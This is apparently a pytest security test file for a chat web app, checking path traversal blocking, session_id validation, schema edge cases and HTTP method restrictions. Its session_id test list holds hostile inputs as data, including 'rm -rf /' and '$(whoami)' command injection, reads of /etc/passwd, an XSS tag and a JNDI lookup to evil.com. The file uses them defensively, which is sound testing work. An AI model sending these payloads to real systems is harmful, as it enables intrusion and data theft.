"""Adversarial stress and boundary security tests for Milestone 1.

Tested components:
- StaticFiles path traversal resistance on /outputs and /static
- Pydantic schema validation and traversal sanitization on POST /chat (session_id, message)
- Schema boundary edge cases (types, empty, whitespace, boundaries)
- HTTP method restriction enforcement (405 Method Not Allowed)
"""

from __future__ import annotations

import pytest
from starlette.testclient import TestClient

from app.main import app


# ══════════════════════════════════════════════════════════════════════
# 1. Path Traversal Attacks
# ══════════════════════════════════════════════════════════════════════

@pytest.mark.parametrize(
    "traversal_path",
    [
        "/outputs/../requirements.txt",
        "/outputs/%2e%2e/app/main.py",
        "/outputs/%2e%2e%2frequirements.txt",
        "/outputs/....//app/main.py",
        "/static/../requirements.txt",
        "/static/%2e%2e/requirements.txt",
        "/outputs/test-sub/../../requirements.txt",
    ],
)
def test_static_outputs_path_traversal_returns_404(sync_client: TestClient, traversal_path: str):
    """StaticFiles must reject any directory traversal attempts with 404."""
    response = sync_client.get(traversal_path)
    assert response.status_code == 404, f"Expected 404 for path '{traversal_path}', got {response.status_code}"


@pytest.mark.asyncio
async def test_raw_asgi_path_traversal_rejected():
    """Verify raw ASGI scope traversal bypass attempts are rejected with 404 by Starlette."""
    traversal_paths = [
        "/outputs/../requirements.txt",
        "/outputs/%2e%2e/app/main.py",
        "/outputs/..%2fapp/main.py",
        "/static/../requirements.txt",
    ]
    for path in traversal_paths:
        messages: list[dict] = []

        async def send(msg: dict):
            messages.append(msg)

        scope = {
            "type": "http",
            "http_version": "1.1",
            "method": "GET",
            "path": path,
            "raw_path": path.encode("utf-8"),
            "query_string": b"",
            "headers": [(b"host", b"testserver")],
            "client": ("127.0.0.1", 12345),
            "server": ("testserver", 80),
            "scheme": "http",
            "app": app,
        }

        async def receive():
            return {"type": "http.request", "body": b"", "more_body": False}

        await app(scope, receive, send)
        start_msg = next((m for m in messages if m["type"] == "http.response.start"), None)
        assert start_msg is not None
        assert start_msg["status"] == 404, f"Raw ASGI traversal '{path}' expected 404, got {start_msg['status']}"


@pytest.mark.parametrize(
    "malicious_session_id",
    [
        "../../etc/passwd",
        "/tmp/bad",
        "bad\x00id",
        "../outputs",
        "..",
        ".",
        "./",
        "..\\..\\windows\\system32",
        "session;rm -rf /",
        "session\x00",
        "$(whoami)",
        "<script>alert(1)</script>",
        '"',
        "'",
        "`cat /etc/passwd`",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "session with spaces",
        "session/with/slashes",
        "session\\backslashes",
        "éèç_unicode",
        "а-я_cyrillic",
        "a" * 65,  # Exceeds 64 chars limit
        "",         # Empty string
        "   ",      # Whitespace only
    ],
)
def test_post_chat_session_id_malicious_traversal_rejected_422(
    sync_client: TestClient, malicious_session_id: str
):
    """POST /chat with path traversal or malicious session_id must be rejected with HTTP 422."""
    response = sync_client.post(
        "/chat",
        json={"session_id": malicious_session_id, "message": "Valid prompt statement"},
    )
    assert response.status_code == 422, (
        f"Expected 422 for session_id '{malicious_session_id}', got {response.status_code}"
    )
    detail = response.json().get("detail", [])
    assert any("session_id" in loc for err in detail for loc in err.get("loc", []))


# ══════════════════════════════════════════════════════════════════════
# 2. Schema Boundary Stress
# ══════════════════════════════════════════════════════════════════════

def test_chat_schema_empty_body(sync_client: TestClient):
    """Empty JSON body {} must return HTTP 422."""
    response = sync_client.post("/chat", json={})
    assert response.status_code == 422
    errors = response.json()["detail"]
    assert len(errors) >= 2


@pytest.mark.parametrize(
    "empty_msg",
    [
        "",
        "   ",
        "\t\n\r",
        " \t ",
    ],
)
def test_chat_schema_empty_or_whitespace_message(sync_client: TestClient, empty_msg: str):
    """Empty or whitespace-only messages must be rejected with HTTP 422."""
    response = sync_client.post(
        "/chat",
        json={"session_id": "valid-session-123", "message": empty_msg},
    )
    assert response.status_code == 422
    errors = response.json()["detail"]
    assert any("message" in loc for err in errors for loc in err.get("loc", []))


@pytest.mark.parametrize(
    ("bad_payload", "expected_err_field"),
    [
        ({"session_id": 123, "message": "Valid message"}, "session_id"),
        ({"session_id": ["list", "val"], "message": "Valid message"}, "session_id"),
        ({"session_id": None, "message": "Valid message"}, "session_id"),
        ({"session_id": "valid-session", "message": []}, "message"),
        ({"session_id": "valid-session", "message": {}}, "message"),
        ({"session_id": "valid-session", "message": 456}, "message"),
        ({"session_id": "valid-session", "message": None}, "message"),
    ],
)
def test_chat_schema_invalid_datatypes(
    sync_client: TestClient, bad_payload: dict, expected_err_field: str
):
    """Invalid datatypes for session_id or message must return HTTP 422."""
    response = sync_client.post("/chat", json=bad_payload)
    assert response.status_code == 422
    errors = response.json()["detail"]
    assert any(expected_err_field in loc for err in errors for loc in err.get("loc", []))


def test_chat_session_id_boundary_lengths(sync_client: TestClient, mock_orchestrator_dialogue):
    """Test exact boundary lengths: 1 char (valid), 64 chars (valid), 65 chars (invalid)."""
    # 1 char valid
    r1 = sync_client.post("/chat", json={"session_id": "a", "message": "Test"})
    assert r1.status_code == 200

    # 64 chars valid
    r64 = sync_client.post("/chat", json={"session_id": "a" * 64, "message": "Test"})
    assert r64.status_code == 200

    # 65 chars invalid
    r65 = sync_client.post("/chat", json={"session_id": "a" * 65, "message": "Test"})
    assert r65.status_code == 422


# ══════════════════════════════════════════════════════════════════════
# 3. HTTP Methods Enforcement
# ══════════════════════════════════════════════════════════════════════

@pytest.mark.parametrize("method", ["post", "put", "delete", "patch"])
def test_root_invalid_methods_return_405(sync_client: TestClient, method: str):
    """Root GET / only allows GET; POST, PUT, DELETE, PATCH must return 405 Method Not Allowed."""
    caller = getattr(sync_client, method)
    response = caller("/")
    assert response.status_code == 405, f"Method {method.upper()} on / expected 405, got {response.status_code}"


@pytest.mark.parametrize("method", ["get", "put", "delete", "patch"])
def test_chat_invalid_methods_return_405(sync_client: TestClient, method: str):
    """POST /chat only allows POST; GET, PUT, DELETE, PATCH must return 405 Method Not Allowed."""
    caller = getattr(sync_client, method)
    response = caller("/chat")
    assert response.status_code == 405, f"Method {method.upper()} on /chat expected 405, got {response.status_code}"
